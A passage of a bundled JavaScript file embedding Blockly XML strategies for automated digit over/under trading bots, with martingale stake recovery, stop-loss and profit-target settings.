</block>\n                </value>\n                <value name="B">\n                  <block type="variables_get" id="~qAjb(rTy9w@H-Ez{;hB">\n                    <field name="VAR" id="U?+6uoFPWWvXN5mJ[^v:" variabletype="">Max Con. Losses</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO1">\n              <block type="text_print" id="3v5:zISS$xz_rz#Eg0n{">\n                <value name="TEXT">\n                  <shadow type="text" id="bU2Dwi1f*NKP~Fv?{siz">\n                    <field name="TEXT">Sorry Max Consecutive losses Hit</field>\n                  </shadow>\n                </value>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="trade_again" id="X[vXkP{_5/81K7p*RpkA"></block>\n            </statement>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="/GmSqFDJXB$3}H`9NFFw" deletable="false" x="0" y="1140">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="text_join" id="psYBvXmne;gtt6OaJyNk" collapsed="true">\n        <field name="VARIABLE" id="WEGiVURDs[glGS3p#2(X" variabletype="">text</field>\n        <statement name="STACK">\n          <block type="text_statement" id="sG@BAM_n(bvSz?%(,S_y">\n            <value name="TEXT">\n              <shadow type="text" id="5D-`BaKx,0PywJ|2*tB_">\n                <field name="TEXT">LAST DIGIT::: </field>\n              </shadow>\n            </value>\n            <next>\n              <block type="text_statement" id="wp[9{6S+pGe94@.L{p*g">\n                <value name="TEXT">\n                  <shadow type="text" id="udjT!Ev}iri(Q2;cM)aR">\n                    <field name="TEXT"></field>\n                  </shadow>\n                  <block type="last_digit" id="Gh:ws?iq1gl}J72^1[U}"></block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <next>\n          <block type="btnotify" id="hJ/Te8dcN1,d7YA8Qp95" collapsed="true">\n            <field name="NOTIFICATION_TYPE">success</field>\n            <field name="NOTIFICATION_SOUND">silent</field>\n            <value name="MESSAGE">\n              <shadow type="text" id="#t2zcXQ:Ai3T0W{R`lo=">\n                <field name="TEXT">Binarytool</field>\n              </shadow>\n              <block type="variables_get" id="],prrlb/_HyL=Fh}Txn;">\n                <field name="VAR" id="WEGiVURDs[glGS3p#2(X" variabletype="">text</field>\n              </block>\n            </value>\n            <next>\n              <block type="controls_if" id=".wb9E!Sv-@{h}SdKG)/:">\n                <value name="IF0">\n                  <block type="logic_compare" id="AqXfp(w)?dr9:8C!/6})">\n                    <field name="OP">LT</field>\n                    <value name="A">\n                      <block type="last_digit" id="D79lc5.%MO{nX8:70I1i"></block>\n                    </value>\n                    <value name="B">\n                      <block type="variables_get" id="-kV(Vh0/;ykkKoJFmBD2">\n                        <field name="VAR" id="3ZEhM-A+2]]J.M_z:t(`" variabletype="">Initial Prediction</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="apollo_purchase" id=",Cx4d}0{$^Qkw)cNwx?o">\n                    <field name="PURCHASE_LIST">DIGITOVER</field>\n                  </block>\n                </statement>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            12472: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" is_dbot="true" collection="false">\n  <variables>\n    <variable type="" id="7Q4y$nr_sr!x2NkOu%)2" islocal="false" iscloud="false">Stake</variable>\n    <variable type="" id="o!-=j_eJZCfW(+iV7;MS" islocal="false" iscloud="false">Tick 1</variable>\n    <variable type="" id="nSn|iFbXeauB$bherh9l" islocal="false" iscloud="false">stake1</variable>\n    <variable type="" id=":Z8WvPXWG?qCe|8=iii1" islocal="false" iscloud="false">Expected Profit</variable>\n    <variable type="" id="^ZmwS_gzK3eAlvzYE4gg" islocal="false" iscloud="false">Prediction</variable>\n    <variable type="" id="!,gw0YFdRduv8|D;trUj" islocal="false" iscloud="false">text1</variable>\n    <variable type="" id="b~M_gc!6d^tXHe/]?+}`" islocal="false" iscloud="false">Tick 2</variable>\n    <variable type="" id="tcz@s#J5]`0C_*$yA%N1" islocal="false" iscloud="false">Stake2</variable>\n    <variable type="" id="Z#~TETh-mwsts1N18G@)" islocal="false" iscloud="false">Your STOP LOSS</variable>\n    <variable type="" id="kV__7}-$y]P?wR^X![BG" islocal="false" iscloud="false">Trade direction</variable>\n    <variable type="" id="!}o95im:dfosc$6[v%LW" islocal="false" iscloud="false">Tick 3</variable>\n    <variable type="" id="~ZEk9Zr7t[g;-`afIGOO" islocal="false" iscloud="false">Initial Stake</variable>\n    <variable type="" id="Op-Cim@t?DJN?i;G)w)C" islocal="false" iscloud="false">Count Loss</variable>\n    <variable type="" id="S|AWDr;xbKU_pbl(^]^B" islocal="false" iscloud="false">Tick 4</variable>\n    <variable type="" id="!mQjsA[]viO$7Gu~UzUn" islocal="false" iscloud="false">Martingale Split</variable>\n    <variable type="" id="O%:U+;QDsX$]{]rSf}F5" islocal="false" iscloud="false">Over Prediction</variable>\n    <variable type="" id="S10~wx4EJ/w3gZZ;v77Y" islocal="false" iscloud="false">Total Lost</variable>\n    <variable type="" id="O)PRE6Ok@%Fp:~T@|bDE" islocal="false" iscloud="false">Under Prediction</variable>\n    <variable type="" id="ypyVjlM$)k$CdN.ur$|q" islocal="false" iscloud="false">text</variable>\n    <variable type="" id="VK7:nSRSXJ=|#p(oAU9v" islocal="false" iscloud="false">Payout %</variable>\n  </variables>\n  <block type="trade_definition" id="1:hr#04jPs#mRkJ:TXm-" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="URQtHd]GoFBJWwd,b|3-" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">R_100</field>\n        <next>\n          <block type="trade_definition_tradetype" id="`|jk|c5cci*-bvcf2Mtu" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">overunder</field>\n            <next>\n              <block type="trade_definition_contracttype" id="iZCt~v+OfpmcNz)@$4`L" deletable="false" movable="false">\n                <field name="TYPE_LIST">both</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="Ze2efd]6SkQm/0JP{I+^" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="#98+jXD2@/Z{LHp1B(Gi" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="0D)nqb}uTXK*4EjyG,kw" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="variables_set" id="{`Xvn6_x=EkqZu8oc5dJ">\n        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n        <value name="VALUE">\n          <block type="math_number" id=".@(#hPU8nBOo1](vZ4Y-">\n            <field name="NUM">1</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="Xmae5N5C.6?#NwhzRu-E">\n            <field name="VAR" id=":Z8WvPXWG?qCe|8=iii1" variabletype="">Expected Profit</field>\n            <value name="VALUE">\n              <block type="math_number" id="[Uo}v(MMW%8n)^c*yC.T">\n                <field name="NUM">3</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="Cj(+x^.$F3ip.g)xnMZk">\n                <field name="VAR" id="Z#~TETh-mwsts1N18G@)" variabletype="">Your STOP LOSS</field>\n                <value name="VALUE">\n                  <block type="math_number" id="X*nS7;=CD77dd?BkyQ*.">\n                    <field name="NUM">100</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="a#/01X+Sst.=$V?.eU=d" collapsed="true">\n                    <field name="VAR" id="~ZEk9Zr7t[g;-`afIGOO" variabletype="">Initial Stake</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="c3#L|$q|9Ny@+1ckC%dN">\n                        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="yO4c)|GdXTB?gu@D1t2[" collapsed="true">\n                        <field name="VAR" id="!mQjsA[]viO$7Gu~UzUn" variabletype="">Martingale Split</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="N9nmlUviwuV[%G1,wx|X">\n                            <field name="NUM">2</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="ath@vJj;F804icVy~D+d">\n                            <field name="VAR" id="VK7:nSRSXJ=|#p(oAU9v" variabletype="">Payout %</field>\n                            <value name="VALUE">\n                              <block type="math_number" id="u8|.Y~-roObvl_.r_#Ss">\n                                <field name="NUM">30</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="q6kMnbavwvQ~8dN]$k.h">\n                                <field name="VAR" id="O%:U+;QDsX$]{]rSf}F5" variabletype="">Over Prediction</field>\n                                <value name="VALUE">\n                                  <block type="math_number" id="eM4Y)COwOPHW3%UyLUDy">\n                                    <field name="NUM">2</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id="TGngYs:#uiR4D]KSzU~s">\n                                    <field name="VAR" id="O)PRE6Ok@%Fp:~T@|bDE" variabletype="">Under Prediction</field>\n                                    <value name="VALUE">\n                                      <block type="math_number" id="i?;w?!vbKj)8!^V7x5;6">\n                                        <field name="NUM">8</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="variables_set" id="IEZvRiF/W?wj_YYkVwCk" collapsed="true">\n                                        <field name="VAR" id="^ZmwS_gzK3eAlvzYE4gg" variabletype="">Prediction</field>\n                                        <value name="VALUE">\n                                          <block type="variables_get" id=",Tyz[WWsq2Oe4FVTXxOj">\n                                            <field name="VAR" id="O%:U+;QDsX$]{]rSf}F5" variabletype="">Over Prediction</field>\n                                          </block>\n                                        </value>\n                                        <next>\n                                          <block type="variables_set" id="~g5:i%LA_pofnTRCHk6A" collapsed="true">\n                                            <field name="VAR" id="kV__7}-$y]P?wR^X![BG" variabletype="">Trade direction</field>\n                                            <value name="VALUE">\n                                              <block type="math_number" id="WFAQ8`9:]L-pkqAvjN5#">\n                                                <field name="NUM">0</field>\n                                              </block>\n                                            </value>\n                                            <next>\n                                              <block type="procedures_callnoreturn" id="/#A2|RQpL{9HAx$H;CL." collapsed="true">\n                                                <mutation name="Trade"></mutation>\n                                                <data>t$~c:}uQBf!?qC%/zuAI</data>\n                                              </block>\n                                            </next>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_tradeoptions" id="3eI2jYWsRMYzJYD/E)==">\n        <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n        <field name="DURATIONTYPE_LIST">t</field>\n        <value name="DURATION">\n          <shadow type="math_number" id="1p)n0/P#H],de2?w4CHQ">\n            <field name="NUM">1</field>\n          </shadow>\n        </value>\n        <value name="AMOUNT">\n          <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="h8H%(/BlJ_@+c1%N4Gwf">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="uqOSN|ki#s)zwj4,`O}M">\n            <field name="VAR" id="nSn|iFbXeauB$bherh9l" variabletype="">stake1</field>\n          </block>\n        </value>\n        <value name="PREDICTION">\n          <shadow type="math_number_positive" id="Enl1?gw5Bpu=.hK/%N^7">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="bc%Bo`i+fwo=@;JdzqU9">\n            <field name="VAR" id="^ZmwS_gzK3eAlvzYE4gg" variabletype="">Prediction</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="%F}}^jH?7Sm.4m7)KF1m" collapsed="true" x="965" y="60">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id="#On$$%{9vd`v$2%,rk=P">\n        <mutation elseif="1" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="SSFfr*aN4,d|!6/Q[6AD">\n            <field name="OP">GT</field>\n            <value name="A">\n              <block type="total_profit" id="ba*[jX2[U(QJ9nXf[%`j"></block>\n            </value>\n            <value name="B">\n              <block type="variables_get" id="5-X[C`]qGO.yqAw:mc7H">\n                <field name="VAR" id=":Z8WvPXWG?qCe|8=iii1" variabletype="">Expected Profit</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="text_join" id="8aJmdcj8d_3dz39Sn5i{">\n            <field name="VARIABLE" id="!,gw0YFdRduv8|D;trUj" variabletype="">text1</field>\n            <statement name="STACK">\n              <block type="text_statement" id="6Joo}i2UQNKa2sG!*J:,">\n                <value name="TEXT">\n                  <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="@M+kC+Y%BXn?x9c5H5RS">\n                    <field name="TEXT"/>\n                  </shadow>\n                  <block type="text" id="(w*P(3vrFxh#!c/QzBo,">\n                    <field name="TEXT">MARVEL PRO</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="text_statement" id="DDvwM16L1$smxVx]vB_y" collapsed="true">\n                    <value name="TEXT">\n                      <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="V}V4WGqDOCv-JT`;`0UK">\n                        <field name="TEXT"/>\n                      </shadow>\n                      <block type="text" id="6)^cr-!N?G;6#y.+wRF{">\n                        <field name="TEXT">&lt;&lt; CONGRATULATIONS. &gt;&gt; You have successfully EARNED... &amp;</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="text_statement" id="n5LD|((i.:wrnSBguHA=">\n                        <value name="TEXT">\n                          <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="8$Tk%`lU.+3Tgx0*^VWb">\n                            <field name="TEXT"/>\n                          </shadow>\n                          <block type="total_profit" id="-D++#sHQQpVcV2d7q/+A"></block>\n                        </value>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="text_print" id="+VlFn*}]Ar}-L}dA@^=j" collapsed="true">\n                <value name="TEXT">\n                  <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="xJ9*P`M8)S9b,_kLuuRV">\n                    <field name="TEXT">abc</field>\n                  </shadow>\n                  <block type="variables_get" id="c7)@~js3jq$@=%0]SF{l">\n                    <field name="VAR" id="!,gw0YFdRduv8|D;trUj" variabletype="">text1</field>\n                  </block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <value name="IF1">\n          <block type="logic_compare" id="Ua?TxY*wNfh}r8Rv*]Zn">\n            <field name="OP">LTE</field>\n            <value name="A">\n              <block type="total_profit" id="./J9uOU^3?p5osi3%~~S"></block>\n            </value>\n            <value name="B">\n              <block type="math_single" id="BLfJcFG(hy.rY|b.r774">\n                <field name="OP">NEG</field>\n                <value name="NUM">\n                  <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="Y|W`s8k/[Y0VX11t)aB%">\n                    <field name="NUM">9</field>\n                  </shadow>\n                  <block type="variables_get" id="gb:|J(a5d^MY{U}Z.B8z">\n                    <field name="VAR" id="Z#~TETh-mwsts1N18G@)" variabletype="">Your STOP LOSS</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO1">\n          <block type="text_print" id=";a@o0+Bc0wOguQC8UatH">\n            <value name="TEXT">\n              <shadow type="text" id="d^H|4h;y=1~Nm!Y}UT}g">\n                <field name="TEXT">Oops! Your Stop Loss Level has been Hit. Kindly Try again Later.</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="ALs8-=^3FJk.8kD:L$Zi">\n            <mutation else="1"></mutation>\n            <value name="IF0">\n              <block type="contract_check_result" id="GDs!tx=!6RBb=NttjVCH">\n                <field name="CHECK_RESULT">loss</field>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="variables_set" id="|HEg%,jfs6OIjW[`GbA4">\n                <field name="VAR" id="kV__7}-$y]P?wR^X![BG" variabletype="">Trade direction</field>\n                <value name="VALUE">\n                  <block type="math_number" id="o@gCV70]I.BKoE.I9AL.">\n                    <field name="NUM">0</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="JAD}h?wLE*}B1.0yRvr|">\n                    <field name="VAR" id="^ZmwS_gzK3eAlvzYE4gg" variabletype="">Prediction</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="s7E2cp)H7m(M+)Tbs$Jk">\n                        <field name="VAR" id="O%:U+;QDsX$]{]rSf}F5" variabletype="">Over Prediction</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="math_change" id="])ENkgwIGK,X^,8,yRq_">\n                        <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                        <value name="DELTA">\n                          <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="P]KhyXq|Q}^?i||zYfiO">\n                            <field name="NUM">1</field>\n                          </shadow>\n                          <block type="variables_get" id="y!U^U$f^HK0/L89n.Jqz">\n                            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="controls_if" id=";R,SNmVqsR9)b4{F(9VD">\n                            <value name="IF0">\n                              <block type="logic_compare" id="u;+v3F+zuS=W)}d;Qgj#">\n                                <field name="OP">GT</field>\n                                <value name="A">\n                                  <block type="variables_get" id="nWAcL(?=Khx)J[Ix%wok">\n                                    <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="math_number" id="3KuN}ah!L7XM%iAH_m06">\n                                    <field name="NUM">0</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="variables_set" id="7mxSZ)Gbt)YmEtz]@91b">\n                                <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                                <value name="VALUE">\n                                  <block type="math_number" id="d9FE;iC?dT.57{iACeg(">\n                                    <field name="NUM">0</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </statement>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="variables_set" id="2HR[R1uyCk)=YvabmnJH">\n                <field name="VAR" id="kV__7}-$y]P?wR^X![BG" variabletype="">Trade direction</field>\n                <value name="VALUE">\n                  <block type="math_number" id="De8KtY/{*xJ@-V+UR}`J">\n                    <field name="NUM">1</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="sP.4]982_uViV@$Lgs],">\n                    <field name="VAR" id="^ZmwS_gzK3eAlvzYE4gg" variabletype="">Prediction</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="5[3TLo$UP3klEC.Yie=t">\n                        <field name="VAR" id="O)PRE6Ok@%Fp:~T@|bDE" variabletype="">Under Prediction</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="math_change" id="J,5:d+O{5/YexIxnhR|,">\n                        <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                        <value name="DELTA">\n                          <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="JdMFA$WZNm5qsf?E=E##">\n                            <field name="NUM">1</field>\n                          </shadow>\n                          <block type="math_single" id="e#Z}5#?Q4h;RU@3L;(V3">\n                            <field name="OP">NEG</field>\n                            <value name="NUM">\n                              <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="ov*f=K(CrwX+_UZ;91!}">\n                                <field name="NUM">9</field>\n                              </shadow>\n                              <block type="read_details" id="A/?yfaGtm#yQ=af*e(R+">\n                                <field name="DETAIL_INDEX">4</field>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="controls_if" id="ZcDcfLO~VCxagXz)hK2[">\n                            <value name="IF0">\n                              <block type="logic_compare" id="U$G*18-PcftkEI6y.:8_">\n                                <field name="OP">LT</field>\n                                <value name="A">\n                                  <block type="variables_get" id="gp}.a*@o,pn04FhYXGCi">\n                                    <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="math_number" id="UE4;|.9K7g)VG^$ZKB|,">\n                                    <field name="NUM">0</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="variables_set" id="EVP*3Fp?BfT~OogsKn!Q">\n                                <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                                <value name="VALUE">\n                                  <block type="math_number" id="$^$pY(7GBFl(Zq+Sdp|w">\n                                    <field name="NUM">0</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </statement>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="controls_if" id="tHpqF.a@7c:WA|Bn$hR!">\n                <mutation else="1"></mutation>\n                <value name="IF0">\n                  <block type="logic_compare" id="L[rrvuziQt,wh2#@r}Uo">\n                    <field name="OP">GT</field>\n                    <value name="A">\n                      <block type="variables_get" id="+mSesB9ItpsX.p$BYNJx">\n                        <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="math_number" id="3UuXUNf:~j(Ds;Y_cQ=9">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="math_change" id="JF8l=jw$T~%gi}k[GO,.">\n                    <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                    <value name="DELTA">\n                      <shadow type="math_number" id="/qr+;Yt7@^gtFKn$_Y8%">\n                        <field name="NUM">1</field>\n                      </shadow>\n                    </value>\n                    <next>\n                      <block type="controls_if" id="%3hsGfNoA:#O]=r47#VY">\n                        <value name="IF0">\n                          <block type="logic_compare" id="x@58*/GS/ox(X6ntxa57">\n                            <field name="OP">EQ</field>\n                            <value name="A">\n                              <block type="variables_get" id="P#Na`s,fM+Q=PxL2tk/?">\n                                <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                              </block>\n                            </value>\n                            <value name="B">\n                              <block type="math_number" id="F~U4N0-1l1@y9I]zGh)#">\n                                <field name="NUM">1</field>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                        <statement name="DO0">\n                          <block type="variables_set" id="UvHQeEMo:=cNF/W1Z(On">\n                            <field name="VAR" id="nSn|iFbXeauB$bherh9l" variabletype="">stake1</field>\n                            <value name="VALUE">\n                              <block type="math_arithmetic" id="Oq!@-|[-Y%]D1_a8Pcm1">\n                                <field name="OP">DIVIDE</field>\n                                <value name="A">\n                                  <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="VTaYqH=07`BwA3=Ey+PF">\n                                    <field name="NUM">1</field>\n                                  </shadow>\n                                  <block type="math_arithmetic" id="^MzyQaU~2,-rOSI/hSl#">\n                                    <field name="OP">MULTIPLY</field>\n                                    <value name="A">\n                                      <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="_Sll8QD~0fvnm}9QW9.{">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="variables_get" id="Zm$,0Y#C6^;nIYUF`/7;">\n                                        <field name="VAR" id="S10~wx4EJ/w3gZZ;v77Y" variabletype="">Total Lost</field>\n                                      </block>\n                                    </value>\n                                    <value name="B">\n                                      <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="YDs:8oXFi]p|G9$lr5l3">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="math_arithmetic" id="sb%Qswy8fS%Qz}{@~1Q6">\n                                        <field name="OP">DIVIDE</field>\n                                        <value name="A">\n                                          <shadow type="math_number" id="-I_UKo^8QNQzR|oYtn;*">\n                                            <field name="NUM">100</field>\n                                          </shadow>\n                                        </value>\n                                        <value name="B">\n                                          <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="yQ6[@+9.oA+30`.3e.Hf">\n                                            <field name="NUM">24</field>\n                                          </shadow>\n                                          <block type="variables_get" id="}^mucVEm7nMka/]l4Hlb">\n                                            <field name="VAR" id="VK7:nSRSXJ=|#p(oAU9v" variabletype="">Payout %</field>\n                                          </block>\n                                        </value>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="82lK1gdoW(kdaF%@Z.j?">\n                                    <field name="NUM">1</field>\n                                  </shadow>\n                                  <block type="variables_get" id="usYJkA1_eiHoCTLWiu)c">\n                                    <field name="VAR" id="!mQjsA[]viO$7Gu~UzUn" variabletype="">Martingale Split</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                          </block>\n                        </statement>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <statement name="ELSE">\n                  <block type="variables_set" id="R%68k/e?iZ~yVK:E#w/t">\n                    <field name="VAR" id="Op-Cim@t?DJN?i;G)w)C" variabletype="">Count Loss</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="RvtrfM*({7Gj7Zuzw[e.">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="j;2yjMhjlHIKu-#$tK;7">\n                        <field name="VAR" id="nSn|iFbXeauB$bherh9l" variabletype="">stake1</field>\n                        <value name="VALUE">\n                          <block type="variables_get" id="0EgMOG.DXE1r/[7X9Qb0">\n                            <field name="VAR" id="~ZEk9Zr7t[g;-`afIGOO" variabletype="">Initial Stake</field>\n                          </block>\n                        </value>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <next>\n                  <block type="controls_if" id="L,;K]6Zifzd*z/TI?~6F">\n                    <value name="IF0">\n                      <block type="logic_compare" id="23%$u8GAD!tLD5?3Pm;!">\n                        <field name="OP">LT</field>\n                        <value name="A">\n                          <block type="variables_get" id="*uWYeNstAd1]1G-w2k8I">\n                            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="math_number" id="i^5(z8)L2`,)(aUO]pML">\n                            <field name="NUM">0.35</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                    <statement name="DO0">\n                      <block type="variables_set" id="xq0MN#:f@qGFjA,vpR:y">\n                        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="3q|j6tSHUrNl;W9mTPFo">\n                            <field name="NUM">0.35</field>\n                          </block>\n                        </value>\n                      </block>\n                    </statement>\n                    <next>\n                      <block type="trade_again" id="o+k~YK1=AEgNoYmQW(H0"></block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id=".:Eg:H(=O6q:j=X}9V_k" collapsed="true" deletable="false" x="0" y="1140">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="controls_if" id="c_T0[vzpaV:9D|qs|HQJ">\n        <mutation else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="V)D;`2s}Wh2JRfbloQ60">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="s(mCt6jX~=xHza3wmvZF">\n                <field name="VAR" id="kV__7}-$y]P?wR^X![BG" variabletype="">Trade direction</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="math_number" id="[x7||RytQCN)e~Te_ajo">\n                <field name="NUM">0</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="apollo_purchase" id="*{Cf*31`Ff.;PIG[6gG/">\n            <field name="PURCHASE_LIST">DIGITOVER</field>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="apollo_purchase" id="[eIN6LE]T7$v1BQN`G+H">\n            <field name="PURCHASE_LIST">DIGITUNDER</field>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="tick_analysis" id=".|`v%$-,OrspNd-m(CI1" collapsed="true" x="0" y="1516">\n    <statement name="TICKANALYSIS_STACK">\n      <block type="variables_set" id="L6,LZo,s-a4HPD/CDU2F">\n        <field name="VAR" id="o!-=j_eJZCfW(+iV7;MS" variabletype="">Tick 1</field>\n        <value name="VALUE">\n          <block type="lists_getIndex" id="?tP{D?68K}1pSB)Mgpbo">\n            <mutation statement="false" at="true"></mutation>\n            <field name="MODE">GET</field>\n            <field name="WHERE">FROM_END</field>\n            <value name="VALUE">\n              <block type="lastDigitList" id="bBAwg).G%,FuppI_i6ya"></block>\n            </value>\n            <value name="AT">\n              <block type="math_number" id="y2YL}S_UD7,_)D^YSB/D">\n                <field name="NUM">1</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="!FXv$N,(u2`Bh`4v~DqR">\n            <field name="VAR" id="b~M_gc!6d^tXHe/]?+}`" variabletype="">Tick 2</field>\n            <value name="VALUE">\n              <block type="lists_getIndex" id=";R,@:p97[-nk:{@QRa[i">\n                <mutation 